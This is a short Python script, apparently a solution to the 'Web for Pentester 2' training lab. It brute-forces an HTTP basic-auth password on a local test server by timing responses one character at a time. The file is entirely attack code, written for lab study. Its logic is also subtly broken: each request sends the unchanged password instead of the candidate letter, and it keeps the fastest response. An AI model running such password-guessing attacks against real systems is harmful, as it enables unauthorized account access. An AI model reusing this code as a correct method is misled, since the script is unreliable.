"""Web for Pentester 2: Authorization example 2."""

"""Timing attack."""

import requests
import time
import sys
import string

password = sys.argv[1]
r = requests.get("http://localhost:8001/authentication/example2/")


"""Example assumes letters and numbers."""
while r.status_code != 200:
	nextletter = ''
	lowestelapsed = 1000.
	for letter in string.ascii_lowercase + string.digits + string.ascii_uppercase:
		start = time.time()
		r = requests.get("http://localhost:8001/authentication/example2/",
			auth=("hacker", password))
		elapsed = time.time() - start
		print("Pass " + password + letter + " in " + str(elapsed))
		if elapsed < lowestelapsed:
			lowestelapsed = elapsed
			nextletter = letter
	password = password + nextletter
	print("Current password: " + password)
print("Password: " + password + letter)
